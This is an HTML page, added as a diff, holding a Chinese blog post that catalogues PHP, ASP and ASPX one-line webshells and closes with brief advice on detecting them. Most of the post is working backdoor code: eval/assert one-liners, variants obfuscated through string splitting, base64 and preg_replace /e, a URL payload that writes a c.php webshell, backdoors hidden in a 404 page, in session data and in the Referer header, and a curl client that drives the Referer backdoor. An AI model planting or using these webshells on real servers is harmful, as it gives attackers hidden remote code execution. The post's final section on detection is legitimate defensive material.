@@ -1,0 +1,121 @@
+<html>
+<head>
+	
+	<title>给我一句话的时间 -- PHP后门溯源</title>
+	<meta name="keywords" content="Just do, Just for fun" />
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+    <!--<link rel="stylesheet" href="/css/main.css" type="text/css">
+-->
+	<link href="/css/main.css?v=2" rel="stylesheet" type="text/css" />
+    <!--<link rel="stylesheet" href="/css/style.css" type="text/css">
+-->
+    
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Atom feed">
+
+    
+	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2"/>
+    
+
+</head>
+
+<body>
+
+<h1 id="给我一句话的时间_—_那些一句话后门">给我一句话的时间 — 那些一句话后门</h1>
+<h2 id="0X01_简单原理">0X01 简单原理</h2>
+<p>在我们进行渗透测试的最后阶段，入侵到内网里，无论是想要浏览网站结构，还是抓取数据库，或者是挂个木马什么的，到最后最常用的就是执行一句话木马，从客户端轻松连接服务器。</p>
+<p>一句话木马的原理很简单，造型也很简单，所以造成了它理解起来容易，抵御起来也容易，于是黑白的较量变成了黑帽不断的构造变形的后门，去隐蔽特征，而白帽则不断的更新过滤方法，建起更高的城墙。</p>
+<p>简单的说一下原理，对于不同的语言有不同的构造方法，基本构造是首先出现的是脚本开始的标记，后边跟着的eval 或者是execute 是核心部分，就是获取并执行后边得到的内容，而后边得到的内容，是request或者是 $_POST 获取的值，显然这些内容，如果我们通过客户端向服务器发送，那么就会让服务器执行我们发送的脚本，挂马就实现了。最常见造型的木马如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--asp一句话木马：--&gt;</span></div><div class="line"><span class="vbscript">&lt;%<span class="keyword">execute</span>(<span class="built_in">request</span>(<span class="string">"value"</span>))%&gt;</span></div><div class="line"><span class="comment">&lt;!--php一句话木马：--&gt;</span></div><div class="line"><span class="php"><span class="preprocessor">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[value]);<span class="preprocessor">?&gt;</span></span></div><div class="line"><span class="comment">&lt;!--aspx一句话木马：--&gt;</span></div><div class="line"><span class="vbscript">&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;</span></div><div class="line"><span class="vbscript">&lt;%<span class="built_in">eval</span>(<span class="built_in">Request</span>.Item[<span class="string">"value"</span>])%&gt;</span></div></pre></td></tr></table></figure>
+
+<h2 id="0X02_变形">0X02 变形</h2>
+<p>黑帽子的目的，就是想尽办法给目标网站插入这么一段会被储存起来的话，可以是一个单独的.asp 或者是.php,.aspx 文件，或者是隐藏在某些网页下，其中的value 就是客户端要发送的内容。然后通过客户端与服务器建立连接，发送控制脚本。</p>
+<p>而上传文件，则涉及到任意文件上传的漏洞挖掘了，这也是黑帽无所不用其极的展现猥琐技术的地方，在此不表。这里，我们先以PHP 为例，去继续深挖那些挂马的技巧。</p>
+<p>在上边的例子中，php 文件，很明显的 eval 可以成为一个静态特征码，webshell扫描工具可以以此为关键词，扫描到这种木马加以屏蔽。于是增加一点技巧的话，我们可以不出现eval:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@<span class="variable">$_GET</span>[a](<span class="variable">$_POST</span>[xxx]);</div></pre></td></tr></table></figure>
+
+<p>一样的，传给a值为 @base64_decode(base64编码过后的eval)，这仍然就是最简单的一句话。<br>甚至，我们还可以连POST 都不出现。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span> <span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b]);<span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>
+
+<p>上边这个例子仅仅使用了GET 函数来构造木马，利用方法是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?a=assert&b=${fputs%<span class="number">28</span>fopen%<span class="number">28</span>base64_decode%<span class="number">28</span>Yy5waHA%<span class="number">29</span>,w%<span class="number">29</span>,base64_decode%<span class="number">28</span>PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%<span class="number">29</span>%<span class="number">29</span>};</div></pre></td></tr></table></figure>
+
+<p>因为我们使用的是PHP 的GET 函数，所以我们的利用方法构造在URL 里，其中的括号部分URL 编码，为了清晰我们把URL 编码的内容转换回来：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?a=assert&b=${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4))};</div></pre></td></tr></table></figure>
+
+
+<p>我们看到，这里有两个base64 的解码，很明显是利用了base64编码来绕过扫描，我们进行解码看看：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?a=assert&b=${fputs(fopen(c.php,w),<span class="preprocessor">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[c]); <span class="preprocessor">?&gt;</span><span class="number">1</span>)};</div></pre></td></tr></table></figure>
+
+<p>执行后当前目录生成c.php 一句话木马，木马内容就是最常见的一句话，这已经算是一个非常隐蔽的木马了，而在PHP 后门的变形之路上，远远不止这些，你甚至可以自己定义一个加密解密的函数，或者是利用xor, 字符串翻转，压缩，截断重组等等方法来绕过。</p>
+<h2 id="0X03_更高级的变形和隐藏">0X03 更高级的变形和隐藏</h2>
+<p>下面我们再看一些强悍的后门：</p>
+<p><strong>利用404页面隐藏木马</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="doctype">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span><span class="tag">&lt;<span class="title">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="title">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span><span class="tag">&lt;<span class="title">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="title">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">p</span>&gt;</span>The requested URL was not found on this server.<span class="tag">&lt;/<span class="title">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span><span class="tag">&lt;/<span class="title">html</span>&gt;</span></div><div class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span></div><div class="line">@preg_replace(<span class="string">"/[pageerror]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'error'</span>],<span class="string">"saft"</span>);</div><div class="line">header(<span class="string">'HTTP/1.1 404 Not Found'</span>);</div><div class="line"><span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>
+
+<p>一般404页面放好后，很少有人会记得定期对404页面进行检查和修改，但如果在404页面里，如果挂上了一句话后门，一方面不会被发现，另一方面，黑帽子很容易能定位到并连接上服务器。</p>
+<p> <strong>无特征隐藏PHP后门</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line">session_start();</div><div class="line"><span class="variable">$_POST</span>[<span class="string">'code'</span>] && <span class="variable">$_SESSION</span>[<span class="string">'theCode'</span>] = trim(<span class="variable">$_POST</span>[<span class="string">'code'</span>]);</div><div class="line"><span class="variable">$_SESSION</span>[<span class="string">'theCode'</span>]&&preg_replace(<span class="string">'\'a\'eis'</span>,<span class="string">'e'</span>.<span class="string">'v'</span>.<span class="string">'a'</span>.<span class="string">'l'</span>.<span class="string">'(base64_decode($_SESSION[\'theCode\']))'</span>,<span class="string">'a'</span>);</div></pre></td></tr></table></figure>
+
+<p>这句话也隐藏了eval 特征码，利用<strong>$_SEESION</strong> 变量来绕过，将<strong>$_POST[‘code’]</strong>赋值给$_SESSION[‘theCode’]，然后eval 执行SESSION 的内容。</p>
+<p>还有一些则是利用HTTP 请求中的hTTP_REFERER 来运行经过base64编码的代码，达到后门的效果，使用两个文件：<br>文件1：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"><span class="comment">//1.php</span></div><div class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</div><div class="line">parse_str(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>], <span class="variable">$a</span>);</div><div class="line"><span class="keyword">if</span>(reset(<span class="variable">$a</span>) == <span class="string">'10'</span> && count(<span class="variable">$a</span>) == <span class="number">9</span>) {</div><div class="line">   <span class="keyword">eval</span>(base64_decode(str_replace(<span class="string">" "</span>, <span class="string">"+"</span>, implode(array_slice(<span class="variable">$a</span>, <span class="number">6</span>)))));</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>HTTP_REFERER 是header 的一部分，告诉服务器是从哪个页面跳转链接过来的，这里边利用了这一字段，来做后门，另一个页面如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"><span class="comment">//2.php</span></div><div class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</div><div class="line"><span class="comment">//要执行的代码</span></div><div class="line"><span class="variable">$code</span> = <span class="string">&lt;&lt;&lt;CODE</span></div><div class="line">phpinfo();</div><div class="line">CODE;</div><div class="line"><span class="comment">//进行base64编码</span></div><div class="line"><span class="variable">$code</span> = base64_encode(<span class="variable">$code</span>);</div><div class="line"><span class="comment">//构造referer字符串</span></div><div class="line"><span class="variable">$referer</span> = <span class="string">"a=10&b=ab&c=34&d=re&e=32&f=km&g={$code}&h=&i="</span>;</div><div class="line"><span class="comment">//后门url</span></div><div class="line"><span class="variable">$url</span> = <span class="string">'http://localhost/test1/1.php'</span>;</div><div class="line"><span class="variable">$ch</span> = curl_init();</div><div class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(</div><div class="line">    CURLOPT_URL =&gt; <span class="variable">$url</span>,</div><div class="line">    CURLOPT_HEADER =&gt; <span class="keyword">FALSE</span>,</div><div class="line">    CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">TRUE</span>,</div><div class="line">    CURLOPT_REFERER =&gt; <span class="variable">$referer</span></div><div class="line">);</div><div class="line">curl_setopt_array(<span class="variable">$ch</span>, <span class="variable">$options</span>);</div><div class="line"><span class="keyword">echo</span> curl_exec(<span class="variable">$ch</span>);</div></pre></td></tr></table></figure>
+
+<p>我们访问文件2，他会构造一个会话，进到后门url 1.php那里，然后在HTTP_REFERER 的内容也会传递给1.php，通过1.php 执行。一般来说，waf会对 referer字段宽松一些，也就造成了一个绕过。</p>
+<p><strong>来一些常见的后门</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>、</div><div class="line"><span class="variable">$hh</span> = <span class="string">"p"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"g"</span>.<span class="string">"_"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"p"</span>.<span class="string">"l"</span>.<span class="string">"a"</span>.<span class="string">"c"</span>.<span class="string">"e"</span>;</div><div class="line"><span class="variable">$hh</span>(<span class="string">"/[discuz]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'h'</span>],<span class="string">"Access"</span>);</div><div class="line"><span class="comment">//菜刀一句话</span></div><div class="line"><span class="number">2</span>、</div><div class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">'xbid'</span>];</div><div class="line"><span class="keyword">include</span> (<span class="variable">$filename</span>);</div><div class="line"><span class="comment">//危险的include函数，直接编译任何文件为php格式运行</span></div><div class="line"><span class="number">3</span>、</div><div class="line"><span class="variable">$reg</span>=<span class="string">"c"</span>.<span class="string">"o"</span>.<span class="string">"p"</span>.<span class="string">"y"</span>;</div><div class="line"><span class="variable">$reg</span>(<span class="variable">$_FILES</span>[MyFile][tmp_name],<span class="variable">$_FILES</span>[MyFile][name]);</div><div class="line"><span class="comment">//重命名任何文件</span></div><div class="line"><span class="number">4</span>、</div><div class="line"><span class="variable">$gzid</span> = <span class="string">"p"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"g"</span>.<span class="string">"_"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"p"</span>.<span class="string">"l"</span>.<span class="string">"a"</span>.<span class="string">"c"</span>.<span class="string">"e"</span>;</div><div class="line"><span class="variable">$gzid</span>(<span class="string">"/[discuz]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'h'</span>],<span class="string">"Access"</span>);</div><div class="line"><span class="comment">//菜刀一句话</span></div><div class="line"><span class="number">5</span>、<span class="keyword">include</span> (<span class="variable">$uid</span>);</div><div class="line"><span class="comment">//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif</span></div><div class="line"><span class="comment">//gif插一句话</span></div><div class="line"><span class="number">6</span>、典型一句话</div><div class="line">程序后门代码</div><div class="line"><span class="preprocessor">&lt;?php</span> eval_r(<span class="variable">$_POST</span>[sb])<span class="preprocessor">?&gt;</span></div><div class="line">程序代码</div><div class="line"><span class="preprocessor">&lt;?php</span> @eval_r(<span class="variable">$_POST</span>[sb])<span class="preprocessor">?&gt;</span></div><div class="line"><span class="comment">//容错代码</span></div><div class="line">程序代码</div><div class="line"><span class="preprocessor">&lt;?php</span> assert(<span class="variable">$_POST</span>[sb]);<span class="preprocessor">?&gt;</span></div><div class="line"><span class="comment">//使用lanker一句话客户端的专家模式执行相关的php语句</span></div><div class="line">程序代码</div><div class="line"><span class="preprocessor">&lt;?</span><span class="variable">$_POST</span>[<span class="string">'sa'</span>](<span class="variable">$_POST</span>[<span class="string">'sb'</span>]);<span class="preprocessor">?&gt;</span></div><div class="line">程序代码</div><div class="line"><span class="preprocessor">&lt;?</span><span class="variable">$_POST</span>[<span class="string">'sa'</span>](<span class="variable">$_POST</span>[<span class="string">'sb'</span>],<span class="variable">$_POST</span>[<span class="string">'sc'</span>])<span class="preprocessor">?&gt;</span></div><div class="line">程序代码</div><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line">@preg_replace(<span class="string">"/[email]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'h'</span>],<span class="string">"error"</span>);</div><div class="line"><span class="preprocessor">?&gt;</span></div><div class="line"><span class="comment">//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入</span></div><div class="line">程序代码</div><div class="line">&lt;O&gt;h=@eval_r(<span class="variable">$_POST1</span>);&lt;/O&gt;</div><div class="line">程序代码</div><div class="line">&lt;script language=<span class="string">"php"</span>&gt;@eval_r(<span class="variable">$_POST</span>[sb])&lt;/script&gt;</div><div class="line"><span class="comment">//绕过&lt;?限制的一句话</span></div></pre></td></tr></table></figure>
+
+<h2 id="0X04_攻防之机">0X04 攻防之机</h2>
+<p>对于攻方，利用各种各样的绕过姿势，都是试图让扫描工具无效。对于守方，分析各种各样的函数，寻找有效的特征码来防止后门。而傲然物外的大牛黑客们，更可以深入web框架内核，挖掘出代码缺陷，构造出复杂的后门利用。</p>
+<p>而作为安全审计人员，只要心细，对那些通过GET，POST 获取的超全局变量，进行细致的追踪，就可以有效的寻找到代码之间的问题，构造合适的过滤器，就可以预防绝大多数后门。</p>
+<p>一个有效而快速的自动化检测方法，是通过语义分析的方式，对GET POST 获取的值进行污染点追踪，以确保这些用户可控的值，不会未经过滤就得到了执行，或是进入数据库中，而语义分析方法，后边会再进行进一步学习。</p>
+<p>当然，这都不是绝对安全的，正如我们前边举得例子，正是利用了SESSION 和 SERVER 这些变量来构造后门，而在PHP 语言中，超全局变量还有这么多：</p>
+<ul>
+<li>$GLOBALS</li>
+<li>$_SERVER</li>
+<li>$_REQUEST</li>
+<li>$_POST</li>
+<li>$_GET</li>
+<li>$_FILES</li>
+<li>$_ENV</li>
+<li>$_COOKIE</li>
+<li>$_SESSION</li>
+</ul>
+<p>所以针对这些变量的语义分析，也就变得更加复杂，漏洞将变得不可避免。同时，诸如include,preg_replace 这些PHP 中危险的变量，也是需要分外注意的。</p>
+<p>所以，一个优秀的程序，是对代码有足够敏感性的，同时对整个架构下的层次权限分配要足够清晰和严格，过滤规则的学习永无止境，安全审查的更新也是永无止境，那些当前看起来人畜无害的部分，随时可能会直插心脏而沦陷。</p>
+
+
+<!--<a href="http://yoursite.com/2016/05/31/给我一句话的时间-PHP后门溯源/#disqus_thread" class="article-comment-link">Comments</a>-->
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'null'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+<div style="display:none">
+<script src="http://s4.cnzz.com/stat.php?id=undefined&web_id=undefined" language="JavaScript"></script>script>
+</div>
+
+
+
+
+
+
+
+</body>
+</html>
